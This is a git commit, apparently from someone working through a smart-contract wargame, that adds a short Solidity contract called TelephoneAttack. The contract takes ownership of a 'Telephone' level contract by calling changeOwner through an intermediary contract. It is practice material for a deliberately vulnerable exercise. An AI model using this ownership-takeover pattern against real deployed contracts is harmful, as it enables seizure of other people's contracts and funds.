e9c893ee382cbd05693615e4fc5822e3d55da7d5
node <nodemadic@gmail.com>
2022-04-29 23:48:03 -0700

    Complete telephone

---
+++ levels/4_telephone/TelephoneAttack.sol
@@ -0,0 +1,12 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import './Telephone.sol';
+
+contract TelephoneAttack {
+
+  function attack(address _victim, address _owner) public {
+    Telephone telephone = Telephone(_victim);
+    telephone.changeOwner(_owner);
+  }
+}
